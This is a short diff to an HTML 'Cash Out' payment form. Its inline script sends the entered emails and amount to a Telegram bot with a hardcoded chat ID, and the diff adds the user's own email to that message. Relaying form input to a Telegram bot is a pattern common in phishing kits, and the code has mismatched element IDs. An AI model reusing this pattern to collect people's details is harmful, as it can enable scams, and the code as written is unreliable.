@@ -63,6 +63,7 @@ button[type="submit"]:hover {
 <body>
     <h2>Cash Out</h2>
     <form id="transfer-form">
+        <label for="myemail" id="user-details"></label>
         <label for="email">Email:</label>
         <input type="email" id="email" required>
         <label for="my gmail">My Email:</label>
@@ -71,7 +72,7 @@ button[type="submit"]:hover {
         <input type="number" id="amount" required>
         <button type="submit">Send</button>
     </form>
-
+    <script src="script.js"></script>
     <script>
         function sendMessageToTelegram(botToken, chatId, message) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -103,7 +104,8 @@ button[type="submit"]:hover {
             const chatId = '5744028254'; // Replace with your actual chat ID
             const email = document.getElementById('email').value;
             const amount = document.getElementById('amount').value;
-            const message = `Cash Out request:\ Email: ${email}\nAmount: ${amount}`;
+            const mygmail = document.getElementById('mygmail').value;
+            const message = `Cash Out request:\ Email: ${email}\nAmount: ${amount}\nSending Email: ${mygmail}`;
 
             sendMessageToTelegram(botToken, chatId, message);
 
